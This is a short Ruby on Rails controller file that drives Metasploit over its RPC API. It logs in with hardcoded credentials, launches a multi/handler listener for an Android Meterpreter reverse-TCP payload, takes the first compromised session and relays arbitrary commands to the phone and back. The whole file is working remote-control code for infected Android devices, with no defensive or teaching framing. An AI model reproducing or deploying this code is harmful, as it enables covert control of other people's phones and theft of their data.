class ApplicationController < ActionController::Base
    def start_msf_process(command)
        require 'msfrpc-client'
        require 'date'
        user = 'cool'
        password = 'looc'
        options = {
          host: '127.0.0.1',
          port: 3333,
          uri:  '/api/',
          ssl:  true
        }
        rpc = Msf::RPC::Client.new(options)
        rpc.login(user, password)
        payloadOptions = {
          'PAYLOAD' => 'android/meterpreter/reverse_tcp',
          'LHOST'   => '0.0.0.0',
          'LPORT'   => 4444
        }
        job = rpc.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
        session=rpc.call('session.list').keys[0]

        puts rpc.call('session.meterpreter_write', session, command)
        sleep 2
        commandOutput = rpc.call('session.meterpreter_read', session).values()[0].split('\n')
        return commandOutput
    end
end
